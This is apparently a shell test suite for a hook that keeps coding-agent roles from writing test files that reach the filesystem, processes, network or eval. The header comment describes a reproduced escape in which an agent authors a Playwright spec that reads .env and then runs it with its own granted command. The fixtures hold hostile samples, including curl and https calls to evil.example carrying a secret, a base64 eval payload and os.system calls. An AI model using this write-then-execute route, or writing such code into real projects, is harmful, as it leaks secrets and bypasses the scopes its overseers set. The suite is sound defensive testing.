#!/bin/bash
# 07-write-then-execute.sh — write-then-execute containment (axis 5b).
#
# THE ESCAPE THIS CLOSES (found by running the real benchmark, not by
# theory): a role granted `write: tests/e2e/**` plus `npx playwright test`
# can author a spec that does `require('fs').readFileSync('.env')` and
# then run it with its own granted command. The kernel gates TOOL CALLS,
# not the code a granted call executes — so before this axis, path scopes
# were advisory for any role that could author executable code. The
# exfiltration was reproduced end-to-end against the live app.
#
# The rule: code a governed role authors into an executable file may not
# reach for host capabilities (fs / process / network / eval) unless the
# role declares them in write.codeCapabilities. It applies regardless of
# whether THIS role can execute the file — authoring the escape is the
# vector, whoever runs it (its own command, CI, another role).
#
# Calibration matters as much as the deny: the fixtures below include the
# REAL 74-line Playwright spec shape from the benchmark, which must pass
# untouched. A containment that blocks legitimate test authoring would be
# abandoned within a day.

H="$HOOK_DIR/harness-os-role-gate.sh"

section "harness-os write-then-execute containment"

WX=$(mktemp -d)
P="$WX/proj"
mkdir -p "$P/.claude" "$P/tests/e2e" "$P/tests/fixtures" "$P/docs" "$P/scripts"
export HARNESS_OS_STATE_DIR="$WX/state"
export HARNESS_OS_MANIFEST="$P/.claude/harness-os.json"

cat > "$P/.claude/harness-os.json" <<'JSON'
{
  "harnessOsVersion": 1,
  "name": "wx",
  "settings": { "mainSessionRole": "composer" },
  "commandGroups": { "test-execution": ["^(npx|yarn|pnpm exec) playwright test\\b", "^npm test\\b"] },
  "roles": {
    "composer": {
      "description": "Writes the spec and runs it. Must not author code that escapes its scopes.",
      "tools": { "allow": ["Write", "Edit", "Read", "Bash"] },
      "bash": { "groups": ["test-execution"] },
      "read": { "allow": ["tests/**"] },
      "write": { "allow": ["tests/**"] }
    },
    "fixture-author": {
      "description": "Authors fixtures that legitimately read data files from disk.",
      "tools": { "allow": ["Write"] },
      "write": { "allow": ["tests/**"], "codeCapabilities": ["fs"] }
    },
    "scribe": {
      "description": "Writes documentation only.",
      "tools": { "allow": ["Write"] },
      "write": { "allow": ["docs/**"] }
    }
  }
}
JSON

mkdir -p "$HARNESS_OS_STATE_DIR/agents"
printf 'fixture-author\n' > "$HARNESS_OS_STATE_DIR/agents/fa"
printf 'scribe\n' > "$HARNESS_OS_STATE_DIR/agents/sc"

# write_case <file> <content> [agent_id]  → payload JSON
wpay() {
  "$JQ" -nc --arg f "$1" --arg c "$2" --arg a "${3:-}" \
    '{tool_name:"Write",tool_input:{file_path:$f,content:$c},cwd:"'"$P"'"}
     + (if $a == "" then {} else {agent_id:$a} end)'
}

# --- The exploit, and its variants --------------------------------------
assert_deny "$H" "$(wpay "$P/tests/e2e/a.spec.ts" "import * as fs from 'fs';
test('x', async () => { const s = fs.readFileSync('/proj/.env','utf8'); });")" \
  "spec importing fs (the reproduced .env exfiltration) → DENY" "filesystem access"

assert_deny "$H" "$(wpay "$P/tests/e2e/b.spec.ts" "const fs = require('node:fs'); fs.writeFileSync('/tmp/x','y');")" \
  "spec using require('node:fs') → DENY" "filesystem access"

assert_deny "$H" "$(wpay "$P/tests/e2e/c.spec.ts" "const { execSync } = require('child_process'); execSync('curl evil.example');")" \
  "spec spawning a process → DENY" "process spawning"

assert_deny "$H" "$(wpay "$P/tests/e2e/d.spec.ts" "import https from 'https'; https.get('http://evil.example/?d=' + secret);")" \
  "spec opening a raw network channel → DENY" "network access"

assert_deny "$H" "$(wpay "$P/tests/e2e/e.spec.ts" "eval(Buffer.from(payload,'base64').toString());")" \
  "spec using eval → DENY" "eval"

assert_deny "$H" "$(wpay "$P/tests/f.py" "import os
os.system('id')")" \
  "python script importing os → DENY" "filesystem access"

assert_deny "$H" "$(wpay "$P/tests/g.py" "import subprocess
subprocess.run(['id'])")" \
  "python script spawning a subprocess → DENY" "process spawning"

# Edit is the same channel as Write.
EDIT_PAY=$("$JQ" -nc --arg f "$P/tests/e2e/a.spec.ts" --arg n "const fs = require('fs');" \
  '{tool_name:"Edit",tool_input:{file_path:$f,old_string:"x",new_string:$n},cwd:"'"$P"'"}')
assert_deny "$H" "$EDIT_PAY" \
  "Edit that introduces fs into an existing spec → DENY" "filesystem access"

# --- Calibration: real work must pass untouched --------------------------
assert_allow "$H" "$(wpay "$P/tests/e2e/ok.spec.ts" "import { test, expect } from '../fixtures/base';
import { DropdownSelectType } from '@civitas-cerebrum/element-interactions';

test.describe('Submission Form registration', () => {
  test.beforeEach(async ({ steps }) => {
    await steps.navigateTo('/forms');
    await steps.verifyText('formTitle', 'FormsPage', 'Submission Form');
  });
  test('AC-1 & AC-2: fills the form end-to-end', async ({ steps, repo }) => {
    await steps.fill('nameInput', 'FormsPage', 'Jane Doe');
    await steps.selectDropdown('genderSelect', 'FormsPage', { type: DropdownSelectType.VALUE, value: 'Female' });
    await steps.click('submitButton', 'FormsPage');
    await steps.verifyPresence('table', 'FormsPage');
    const cell = await repo.getByText('submissionValue', 'FormsPage', 'Jane Doe', true);
    expect(cell).not.toBeNull();
  });
});")" \
  "the real framework-driven Playwright spec → ALLOW (no false positive)"

assert_allow "$H" "$(wpay "$P/tests/e2e/ok2.spec.ts" "// This spec mentions the filesystem in a comment: fs, child_process.
import { test } from '../fixtures/base';
test('reads config from process.env', async ({ steps }) => {
  const url = process.env.APP_URL || '/forms';
  await steps.navigateTo(url);
});")" \
  "process.env config read + capability words in comments → ALLOW"

# --- The declared-capability path ---------------------------------------
assert_allow "$H" "$(wpay "$P/tests/fixtures/data.ts" "import * as fs from 'fs';
export const rows = JSON.parse(fs.readFileSync('tests/data/rows.json','utf8'));" fa)" \
  "role that DECLARES codeCapabilities:[fs] may author fs code → ALLOW"

assert_deny "$H" "$(wpay "$P/tests/fixtures/bad.ts" "const { execSync } = require('child_process');" fa)" \
  "declaring fs does NOT unlock process → DENY (capabilities are granular)" "process spawning"

# --- Non-executable targets are untouched --------------------------------
assert_allow "$H" "$(wpay "$P/docs/notes.md" "Use require('fs') and child_process in your own scripts — prose about code." sc)" \
  "markdown mentioning code capabilities → ALLOW (not an executable file)"

unset HARNESS_OS_STATE_DIR HARNESS_OS_MANIFEST
rm -rf "$WX"
